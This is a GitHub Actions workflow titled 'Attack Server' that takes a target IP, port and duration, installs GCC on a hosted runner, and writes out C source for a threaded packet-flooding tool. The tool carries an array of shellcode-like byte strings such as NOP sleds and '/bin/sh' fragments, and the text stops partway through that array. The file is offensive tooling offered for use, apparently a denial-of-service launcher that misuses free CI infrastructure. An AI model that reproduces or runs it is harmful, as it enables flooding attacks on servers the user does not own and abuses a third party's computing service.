name: Attack Server

on:
  workflow_dispatch:
    inputs:
      ip:
        description: 'Target IP'
        required: true
        type: string
      port:
        description: 'Target Port'
        required: true
        type: string
      duration:
        description: 'Duration (seconds)'
        required: true
        default: '30'
        type: string

jobs:
  attack:
    runs-on: ubuntu-latest
    
    steps:
    - name: Install GCC
      run: sudo apt update && sudo apt install gcc -y
    
    - name: Compile & Run
      run: |
        cat > unreal.c << 'EOF'
        #include <stdio.h>
        #include <stdlib.h>
        #include <string.h>
        #include <unistd.h>
        #include <arpa/inet.h>
        #include <pthread.h>
        #include <time.h>
        
        void *send_packets(void *arg) {
            char **args = (char**)arg;
            char *ip = args[1];
            int port = atoi(args[2]);
            int duration = atoi(args[3]);
            
            int sock;
            struct sockaddr_in addr;
            time_t endtime;
            
            char *payloads[] = {
                "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90",
                "\xB8\x04\x01\x00\x00",
                "\x68\x7F\x00\x00\x01",
                "\xFF\xD0",
                "\xEB\xFE",
                "\x68\x2F\x62\x69\x6E\x89\xe3\x6A\x0B\x58",
                "\x90\x90\x90\x90\x90",
                "\x48\x31\xc0\x48\x89\xc2\x48\x89\xe7",
                "\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xe3\x52\x53\x54",
                "\xBA\xAD\xF0\x0D",
                "\xC3",
                "\x6A\x0B\x58\x99\x52\x57",
                "\x68\x7F\x00\x00\x01",
                "\x90\x90\x90\x90\x90",
                "\xB8\x01\x00\x00\x00\xFF\xD0",
                "\xAA\xBB\xCC\xDD\xEE\xFF",
                "\xFF\xFF\xFF\xFF\xFF\xFF",
                "\xC0\xA8\x00\x68",
                "\x68\x65\x6C\x6C\x6F\x20\x57\x6F\x72\x6C\x64\x21",
                "\x68\x2F\x62\x69\x6E\x89\xe3\x6A\x0B\x58",
                "\x68\x7F\x00\x00\x01",
                "\xFF\xD0",
                "\x48\x31\xc0\x48\x89\xc2\x48\x89\xe7",
                "\xEB\xFE",
                "\xB8\x01\x00\x00\x00\xFF\xD0",
                "\x52\x57\x68\x2F\x2F\x73\x68",
